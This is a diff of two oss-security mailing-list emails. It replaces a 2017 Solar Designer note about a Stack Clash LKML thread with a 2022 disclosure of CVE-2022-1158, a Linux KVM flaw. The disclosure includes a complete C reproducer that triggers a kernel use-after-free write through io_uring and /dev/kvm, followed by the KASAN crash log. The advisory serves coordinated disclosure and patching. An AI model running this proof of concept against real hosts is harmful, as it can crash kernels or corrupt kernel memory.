@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1348" "Wednesday" "5" "July" "2017" "16:00:31" "+0200" "Solar Designer" "solar@openwall.com" "<20170705140031.GA31519@openwall.com>" "27" "[oss-security] LKML thread \"mm: larger stack guard gap, between vmas\" partially CC'ed to linux-distros" "^Date:" nil nil "7" "2017070514:00:31" "[oss-security] LKML thread \"mm: larger stack guard gap, between vmas\" partially CC'ed to linux-distros" (number mark "        solar@openwa Jul  5   27/1348  " thread-indent "\"[oss-security] LKML thread \"mm: larger stack guard gap, between vmas\" partially CC'ed to linux-distros\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 16277 invoked by uid 550); 5 Jul 2017 14:01:24 -0000
+Received: (qmail 5753 invoked by uid 550); 8 Apr 2022 09:07:35 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,42 +6,269 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 15871 invoked from network); 5 Jul 2017 14:00:40 -0000
-Message-ID: <20170705140031.GA31519@openwall.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-User-Agent: Mutt/1.4.2.3i
-Date: Wed, 5 Jul 2017 16:00:31 +0200
-From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] LKML thread "mm: larger stack guard gap, between vmas" partially CC'ed to linux-distros
+Received: (qmail 24406 invoked from network); 8 Apr 2022 02:25:25 -0000
+X-F-Verdict: SPFVALID
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=tsmtp0001.email;
+	s=titan1; t=1649384713;
+	bh=ttswuigY+26crBHO9dMAY9Nrm3FWmWKGtSdgLbwtkiQ=;
+	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:From:To:Cc:
+	 Subject:Message-ID;
+	b=Zl6xRXWd2gJeQaWmDK8XWi1xx2mqegR9Vm9wv2kQkrALenm42jx1pq6AjeZd176gb
+	 18kYYAIWk/HAT1DNelqZ0Is20Yc2JyQT6uDocYDn76IGpvRGpeneNTEOY5XERlwQ+z
+	 OntoJ+zWkTFfnHvmfbtxnok6C7HlQw1ELwCznpts=
+Message-ID: <3bdfe579-167a-46d5-73a6-fec9b05c5e04@sysec.org>
+Date: Fri, 8 Apr 2022 10:24:48 +0800
+MIME-Version: 1.0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
+ Thunderbird/91.7.0
+Content-Language: en-US
 To: oss-security@lists.openwall.com
+Cc: pgn@zju.edu.cn, kangel <kangel@zju.edu.cn>, Tyler Hicks
+ <code@tyhicks.com>, Marian Rehak <mrehak@redhat.com>,
+ Paolo Bonzini <pbonzini@redhat.com>, John Haxby <john.haxby@oracle.com>
+Feedback-ID: :qiuhao@sysec.org:sysec.org:flockmailId
+From: Qiuhao Li <qiuhao@sysec.org>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+X-CMAE-Score: 0
+X-CMAE-Analysis: v=2.4 cv=VdbkgXl9 c=1 sm=1 tr=0 ts=624f9d09
+	a=9zuiwUaE+4GOE7xYIc90Uw==:117 a=9zuiwUaE+4GOE7xYIc90Uw==:17
+	a=IkcTkHD0fZMA:10 a=CEWIc4RMnpUA:10 a=NEAV23lmAAAA:8 a=u-UUKw4dAAAA:8
+	a=VwQbUJbxAAAA:8 a=acTSsvx8YFqkJVrEUkcA:9 a=QEXdDO2ut3YA:10
+	a=cklHB5Dw1nV-3JPruhv7:22 a=AjGcO6oz07-iQ99wixmX:22
+X-Virus-Scanned: ClamAV using ClamSMTP
+Subject: [oss-security] CVE-2022-1158: Linux Kernel v5.2+: x86/kvm: cmpxchg_gpte can write to
+ pfns outside the userspace region
 
-Hi,
+-- [ Description
 
-In the Stack Clash disclosure aftermath, there's a thread "[PATCH] mm:
-larger stack guard gap, between vmas" still going on LKML, which is
-attempted to be CC'ed to linux-distros (as linux-distros was among the
-recipients on similar threads with security@k.o involved prior to the
-public disclosure).  Some of these messages get through (those that
-include [vs-plain] in the Subject), the rest don't.  (It might as well
-be several threads now.)
+When KVM updates a guest's page table entry, it first tries to pin the page
+with get_user_pages_fast(). If it fails and vma-->flags has VM_PFNMAP, it
+will calculate the physical address, map the page to the kernel address
+space and write the update [1]:
 
-This makes little sense to me, and it also creates the situation that if
-any new security issues are disclosed in that thread (which might or
-might not be the case with LibreOffice and Java trying and failing to
-install their own stack guard pages after the kernel has been patched,
-if I read this right) then per linux-distros list policy we'd need to
-bring them specifically to oss-security (but it's tough to do when the
-thread doesn't make the issue reports explicit - rather, people are just
-discussing things).
+pfn = ((vaddr - vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;
+paddr = pfn << PAGE_SHIFT;
+table = memremap(paddr, PAGE_SIZE, MEMREMAP_WB);
+if (!table) {
+     mmap_read_unlock(current->mm);
+     return -EFAULT;
+}
+ret = CMPXCHG(&table[index], orig_pte, new_pte);
 
-On one hand, this is our continuing reminder of just how very wrong we
-were with the embargo.  (Of course, some of us will continue to disagree
-with this assessment.)  On the other hand, perhaps we should forcibly
-kill those CC's now - ask people to stop, or just filter on the server.
-I am going to start by asking.  Once again, that content is public on
-LKML anyway.
+The vm_pgoff is used as the offset of pfns to get the page's pfn. However,
+this hack only works for memory maps like /dev/mem where vm_pgoff is used as
+the pfn passed to remap_pfn_range() [2]. For many other cases, it will be a
+bug. E.g., io_uring [3] passed the pfn of its ring buffer to
+remap_pfn_range() instead of vm_pgoff [4] [5]. As vaddr and vm_pgoff are
+controllable by user-mode processes, writing may exceed the userspace region
+and trigger exceptions.
 
-Alexander
+This bug was introduced in v5.2 [6] and assigned CVE-2022-1158.
+
+-- [ Impact
+
+/dev/kvm is accessible by unprivileged local users, so a userspace process
+may leverage this bug to corrupt the kernel, resulting in a denial of
+service condition or potentially achieving privilege escalation. But, since
+the write is a compare-and-exchange operation that only updates the
+Access/Dirty bit, we don't think exploiting this single bug will be easy.
+
+
+-- [ Mitigation
+
+For distros and stable, Paolo Bonzini sent an inline assembly patch that
+updates the gPTE using a valid userspace address [7].
+
+With the same method, Sean Christopherson and Peter Zijlstra introduced
+macros for CMPXCHG and replaced cmpxchg_gpte() with __try_cmpxchg_user()
+[8].
+
+
+-- [ Reproducer
+
+Here we use the mapped memory of io_uring as the guest's memory and perform
+the KVM_TRANSLATE operation, triggering a UAF exception [9].
+
+/*
+* Tested on Linux v5.17 (KASLR disabled) with Debian 11.
+* Leads to KASAN UAF write exception and endless page walking.
+*/
+
+#include <fcntl.h>
+#include <linux/io_uring.h>
+#include <linux/kvm.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define MMAP_ADDR ((void*)0x20000000)
+#define MMAP_SIZE (0x1000000)
+#define GUEST_MEM_ADDR ((void*)0x20004000)
+
+void kvm_setup_user_mem(const int vm_fd, char* const host_mem)
+{
+   struct kvm_userspace_memory_region memreg = {.slot = 0};
+   memreg.memory_size = 4096;
+   memreg.userspace_addr = (uintptr_t)host_mem;
+   ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION, &memreg);
+}
+
+int main(void)
+{
+   mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE, \
+   MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED, -1, 0);
+
+   int kvm_fd = open("/dev/kvm", O_RDWR | O_CLOEXEC);
+   int vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, (unsigned long)0);
+   int vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, (unsigned long)0);
+
+   // guest's mem: 0x20004000 - 0x20005000, 4k
+   kvm_setup_user_mem(vm_fd, (char*)GUEST_MEM_ADDR);
+
+   // io_uring map size: 4k * 0x100
+   uint32_t entries = 64 * 0x100;
+   struct io_uring_params params = {.flags = 0};
+   int fd = syscall(__NR_io_uring_setup, entries, &params);
+   size_t sz = params.sq_entries * sizeof(struct io_uring_sqe);
+   // overlap with guest's mem
+   void *vma = MMAP_ADDR;
+   mmap(vma, sz, PROT_READ | PROT_WRITE, \
+   MAP_SHARED | MAP_POPULATE | MAP_FIXED, fd, IORING_OFF_SQES);
+
+   uint64_t *tmp = (uint64_t*)(GUEST_MEM_ADDR);
+   *tmp = 1; // PDB = 0 PTE: Present = 1
+
+   // PG: enable paging, CR3 = 0
+   struct kvm_sregs kvm_sregs = {.cr0 = 0x80000000};
+   ioctl(vcpu_fd, KVM_SET_SREGS, &kvm_sregs);
+
+   struct kvm_translation kvm_translation = {.linear_address = 0x0};
+   ioctl(vcpu_fd, KVM_TRANSLATE, &kvm_translation);
+   // UAF: ffff888000000000+IORING_OFF_SQES+(GUEST_MEM_ADDR-vma)
+
+   return 0;
+}
+
+
+-- [ Credits
+
+Qiuhao Li (Harbin Institute of Technology)
+Gaoning Pan (Zhejiang University)
+Yongkang Jia (Zhejiang University)
+
+
+-- [ Acknowledgments
+
+Tyler Hicks, Marian Rehak, Paolo Bonzini, Sean Christopherson, and other
+developers responded to our report fast and professionally. Thanks.
+
+
+-- [ References
+
+[1] 
+https://github.com/torvalds/linux/blob/1930a6e739c4b4a654a69164dbe39e554d228915/arch/x86/kvm/mmu/paging_tmpl.h#L146
+[2] 
+https://github.com/torvalds/linux/blob/1930a6e739c4b4a654a69164dbe39e554d228915/drivers/char/mem.c#L397
+[3] https://kernel.dk/io_uring.pdf
+[4] 
+https://github.com/torvalds/linux/blob/1930a6e739c4b4a654a69164dbe39e554d228915/fs/io_uring.c#L10767
+[5] 
+https://github.com/torvalds/linux/blob/1930a6e739c4b4a654a69164dbe39e554d228915/fs/io_uring.c#L10772
+[6] 
+https://github.com/torvalds/linux/commit/bd53cb35a3e9adb73a834a36586e9ad80e877767
+[7] 
+https://git.kernel.org/pub/scm/virt/kvm/kvm.git/commit/?h=queue&id=2a8859f373b0a86f0ece8ec8312607eacf12485d
+[8] 
+https://git.kernel.org/pub/scm/virt/kvm/kvm.git/commit/?id=cc8c837cf1b2f714dda723541c04acd1b8922d92
+[9] KASAN Report
+[   10.192115] 
+==================================================================
+[   10.192696] BUG: KASAN: use-after-free in 
+paging32_walk_addr_generic+0xb99/0xd40
+[   10.193273] Write of size 4 at addr ffff888010004000 by task a.out/234
+
+[   10.193897] CPU: 0 PID: 234 Comm: a.out Not tainted 5.17.0 #9
+[   10.194346] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), 
+BIOS 1.14.0-2 04/01/2014
+[   10.194981] Call Trace:
+[   10.195176]  <TASK>
+[   10.195342]  dump_stack_lvl+0x34/0x44
+[   10.195634]  print_address_description.constprop.0+0x1f/0x150
+[   10.196075]  ? paging32_walk_addr_generic+0xb99/0xd40
+[   10.196469]  kasan_report.cold+0x7f/0x11b
+[   10.196786]  ? vmacache_find+0x91/0x100
+[   10.197102]  ? paging32_walk_addr_generic+0xb99/0xd40
+[   10.197490]  kasan_check_range+0xf5/0x1d0
+[   10.197807]  paging32_walk_addr_generic+0xb99/0xd40
+[   10.198181]  ? kvm_faultin_pfn+0x560/0x560
+[   10.198510]  ? vmx_vcpu_pi_load+0x1e7/0x310
+[   10.198843]  ? reset_guest_paging_metadata+0x163/0x210
+[   10.199245]  paging32_gva_to_gpa+0x85/0x130
+[   10.199575]  ? paging32_walk_addr_generic+0xd40/0xd40
+[   10.199966]  ? vmx_vcpu_put+0x80/0x3c0
+[   10.200265]  ? kvm_arch_vcpu_load+0x181/0x360
+[   10.200611]  ? mutex_lock_killable+0x89/0xe0
+[   10.200952]  kvm_arch_vcpu_ioctl_translate+0x6e/0xf0
+[   10.201346]  kvm_vcpu_ioctl+0x66e/0x850
+[   10.201659]  ? kvm_set_memory_region+0x40/0x40
+[   10.202011]  ? faultin_vma_page_range+0x100/0x100
+[   10.202382]  ? vm_mmap_pgoff+0x184/0x1e0
+[   10.202696]  ? randomize_stack_top+0x80/0x80
+[   10.203036]  ? __fget_light+0x1be/0x200
+[   10.203333]  __x64_sys_ioctl+0xb1/0xf0
+[   10.203654]  do_syscall_64+0x38/0x90
+[   10.203861]  entry_SYSCALL_64_after_hwframe+0x44/0xae
+[   10.204174] RIP: 0033:0x7f5f4088ecc7
+[   10.204426] Code: 00 00 00 48 8b 05 c9 91 0c 00 64 c7 00 26 00 00 00 
+48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 
+05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 99 91 0c 00 f7 d8 64 89 01 48
+[   10.205783] RSP: 002b:00007ffc0b268878 EFLAGS: 00000217 ORIG_RAX: 
+0000000000000010
+[   10.206359] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 
+00007f5f4088ecc7
+[   10.206906] RDX: 00007ffc0b268880 RSI: 00000000c018ae85 RDI: 
+0000000000000005
+[   10.207452] RBP: 00007ffc0b268a90 R08: 0000000000000006 R09: 
+0000000010000000
+[   10.208000] R10: 0000000000008011 R11: 0000000000000217 R12: 
+00005630e22e1080
+[   10.208557] R13: 0000000000000000 R14: 0000000000000000 R15: 
+0000000000000000
+[   10.209118]  </TASK>
+
+[   10.209421] The buggy address belongs to the page:
+[   10.209794] page:000000008cfacc49 refcount:0 mapcount:0 
+mapping:0000000000000000 index:0x0 pfn:0x10004
+[   10.210500] flags: 0x100000000000000(node=0|zone=1)
+[   10.210882] raw: 0100000000000000 ffffea0000400108 ffffea0000400108 
+0000000000000000
+[   10.211479] raw: 0000000000000000 0000000000000000 00000000ffffffff 
+0000000000000000
+[   10.212071] page dumped because: kasan: bad access detected
+
+[   10.212628] Memory state around the buggy address:
+[   10.213014]  ffff888010003f00: ff ff ff ff ff ff ff ff ff ff ff ff ff 
+ff ff ff
+[   10.213566]  ffff888010003f80: ff ff ff ff ff ff ff ff ff ff ff ff ff 
+ff ff ff
+[   10.214119] >ffff888010004000: ff ff ff ff ff ff ff ff ff ff ff ff ff 
+ff ff ff
+[   10.214666]                    ^
+[   10.214920]  ffff888010004080: ff ff ff ff ff ff ff ff ff ff ff ff ff 
+ff ff ff
+[   10.215469]  ffff888010004100: ff ff ff ff ff ff ff ff ff ff ff ff ff 
+ff ff ff
+[   10.216023] 
+==================================================================
+[   10.216576] Disabling lock debugging due to kernel taint
+
+
+Best Regards,
+   Qiuhao Li
